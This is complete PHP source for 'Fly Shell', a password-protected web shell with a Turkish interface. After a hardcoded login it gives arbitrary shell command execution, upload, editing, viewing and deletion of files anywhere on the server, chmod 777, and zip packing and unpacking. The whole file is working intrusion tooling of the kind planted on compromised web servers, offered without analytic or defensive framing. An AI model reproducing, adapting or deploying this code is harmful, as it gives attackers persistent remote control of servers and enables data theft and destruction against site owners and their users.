<?php
session_start();

// Çıkış İşlemi
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php");
    exit;
}

// Giriş Bilgileri
$USERNAME = "fly";
$PASSWORD = "fly";

// Giriş Kontrol
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['user'] === $USERNAME && $_POST['pass'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
    } else {
        echo '
        <style>
            body {
                background: #0f0f0f;
                color: #eee;
                font-family: "Segoe UI", sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-box {
                background: #1e1e1e;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 0 20px rgba(0,0,0,0.7);
                text-align: center;
                width: 300px;
            }
            .login-box h1 {
                margin-bottom: 20px;
                color: #4fc3f7;
                font-size: 32px;
                letter-spacing: 4px;
            }
            input, button {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #444;
                border-radius: 5px;
                background: #2a2a2a;
                color: #fff;
                font-size: 16px;
            }
            button {
                background-color: #4fc3f7;
                color: #000;
                cursor: pointer;
                font-weight: bold;
                transition: background-color 0.3s ease;
            }
            button:hover {
                background-color: #29b6f6;
            }
            .fly-logo {
                font-size: 24px;
                font-weight: bold;
                color: #29b6f6;
                letter-spacing: 8px;
                margin-bottom: 10px;
            }
        </style>

        <div class="login-box">
            <div class="fly-logo">FLY</div>
            <h1>Giriş Paneli</h1>
            <form method="POST">
                <input name="user" placeholder="Kullanıcı Adı">
                <input name="pass" type="password" placeholder="Şifre">
                <button>🔐 Giriş Yap</button>
            </form>
        </div>';
        exit;
    }
}

// Ana Dizine Git
$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
chdir($dir);
$dir = getcwd();

// .htaccess koruması
$ht_path = $dir.'/.htaccess';
if (!file_exists($ht_path)) {
    file_put_contents($ht_path, "Options -Indexes\n");
}

// Fonksiyonlar
function format_size($size) {
    $units = ['B','KB','MB','GB','TB'];
    for ($i = 0; $size > 1024 && $i < 4; $i++) $size /= 1024;
    return round($size, 2) . ' ' . $units[$i];
}

// Çıktı stili + çıkış butonu
echo "<style>
body{background:#121212;color:#eee;font-family:monospace;padding:20px}
a{color:#4fc3f7;text-decoration:none}
input,button,textarea{background:#1e1e1e;color:#fff;border:1px solid #555;padding:5px;margin:5px}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #444;padding:6px}
tr:hover{background:#333}
pre{white-space:pre-wrap;word-break:break-word}
.logout-button {
    position: fixed;
    top: 20px;
    right: 20px;
    background: #f44336;
    color: #fff;
    padding: 8px 14px;
    border: none;
    border-radius: 6px;
    font-weight: bold;
    cursor: pointer;
    text-decoration: none;
}
</style>";

echo "<a href='?logout=1' class='logout-button'>🚪 Çıkış Yap</a>";

echo "<h2>🚀 Fly Shell</h2>";
echo "<p><b>📂 Şu Anki Dizin:</b> $dir</p>";
echo "<p><a href='?d=" . urlencode(dirname($dir)) . "'>⬅️ Üst Dizin</a></p>";

// Yükleme, klasör/dosya oluşturma, chmod, zip işlemleri vs
if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
if (isset($_POST['newdir'])) mkdir($_POST['newdir']);
if (isset($_POST['create_file'])) file_put_contents($_POST['file_name'], $_POST['file_content']);
if (isset($_POST['chmod'])) chmod($_POST['file'], octdec($_POST['chmod']));
if (isset($_POST['set_permissions'])) chmod($_POST['set_permissions'], 0777);
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (basename($target) === 'index.php') {
        echo "<script>alert('index.php korumalıdır!');</script>";
    } elseif (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
}
if (isset($_POST['zip_create'])) {
    $zip = new ZipArchive;
    if ($zip->open($_POST['zip_name'], ZipArchive::CREATE) === TRUE) {
        $target = $_POST['zip_target'];
        if (is_file($target)) {
            $zip->addFile($target);
        } else {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target));
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relative = substr($filePath, strlen($target) + 1);
                    $zip->addFile($filePath, $relative);
                }
            }
        }
        $zip->close();
    }
}
if (isset($_POST['zip_extract'])) {
    $zip = new ZipArchive;
    if ($zip->open($_POST['zip_file']) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
    }
}
$terminal_output = "";
if (isset($_POST['terminal']) && !empty($_POST['command'])) {
    $terminal_output = shell_exec($_POST['command'] . " 2>&1");
}
$search_result = [];
if (isset($_POST['search']) && !empty($_POST['keyword'])) {
    foreach (scandir($dir) as $item) {
        if (stripos($item, $_POST['keyword']) !== false) {
            $search_result[] = $item;
        }
    }
}
if (isset($_GET['view'])) {
    echo "<pre style='background:#1e1e1e;color:#0f0;padding:20px;'>".htmlspecialchars(file_get_contents($_GET['view']))."</pre><a href='?d={$dir}'>⬅️ Geri</a>";
    exit;
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $file_content = file_get_contents($_GET['edit']);
    echo "<form method='POST'>
        <textarea name='edit_content' rows='10' cols='50'>".htmlspecialchars($file_content)."</textarea><br>
        <button name='save_edit' value='{$_GET['edit']}'>Kaydet</button>
    </form>";
}
if (isset($_POST['save_edit'])) {
    file_put_contents($_POST['save_edit'], $_POST['edit_content']);
    echo "<script>alert('Dosya kaydedildi.'); window.location.href='?d={$dir}';</script>";
}

// Arayüz formları
echo <<<HTML
<form method="POST" enctype="multipart/form-data">
    📤 Dosya Yükle: <input type="file" name="upload">
    <button>Yükle</button>
</form>
<form method="POST">
    📁 Yeni Klasör: <input name="newdir">
    <button>Oluştur</button>
</form>
<form method="POST">
    📝 Dosya Oluştur: <input name="file_name" placeholder="dosya_adı.txt">
    <textarea name="file_content" rows="5" cols="40" placeholder="Dosya içeriği"></textarea>
    <button name="create_file">Oluştur</button>
</form>
<form method="POST">
    🔐 CHMOD: <input name="file" placeholder="dosya.txt">
    <input name="chmod" placeholder="0777">
    <button>Uygula</button>
</form>
<form method="POST">
    🔍 Ara: <input name="keyword">
    <button name="search">Bul</button>
</form>
<form method="POST">
    📦 Zip Oluştur: <input name="zip_target" placeholder="dosya/klasör">
    <input name="zip_name" placeholder="arsiv.zip">
    <button name="zip_create">Ziple</button>
</form>
<form method="POST">
    📂 Zip Aç: <input name="zip_file" placeholder="arsiv.zip">
    <button name="zip_extract">Aç</button>
</form>
<form method="POST">
    💻 Komut: <input name="command" style="width:300px">
    <button name="terminal">Çalıştır</button>
</form>
<form method="POST">
    ⚙️ İzinleri 777 Yap: <input name="set_permissions" placeholder="dosya_veya_klasör">
    <button>Uygula</button>
</form>
<pre>$terminal_output</pre>
<hr>
HTML;

// Dosya/klasör listeleme
$items = isset($_POST['search']) ? $search_result : scandir($dir);
echo "<table><tr><th>İsim</th><th>Boyut</th><th>İzin</th><th>İşlem</th></tr>";
foreach ($items as $item) {
    if ($item == ".") continue;
    $path = $dir . "/" . $item;
    $size = is_dir($path) ? "--" : format_size(filesize($path));
    $perm = substr(sprintf('%o', fileperms($path)), -4);
    echo "<tr>
        <td><a href='?d=".urlencode($path)."'>$item</a></td>
        <td>$size</td>
        <td>$perm</td>
        <td>
            <a href='?view=".urlencode($path)."'>📑</a> 
            <a href='?d=$dir&delete=".urlencode($path)."' onclick='return confirm(\"Silinsin mi?\")'>❌</a>
            <a href='?d=$dir&set_permissions=".urlencode($path)."' onclick='return confirm(\"İzinleri 777 yapilsin mi?\")'>⚙️</a>
            <a href='?d=$dir&edit=".urlencode($path)."'>📝</a>
        </td>
    </tr>";
}
echo "</table>";
?>
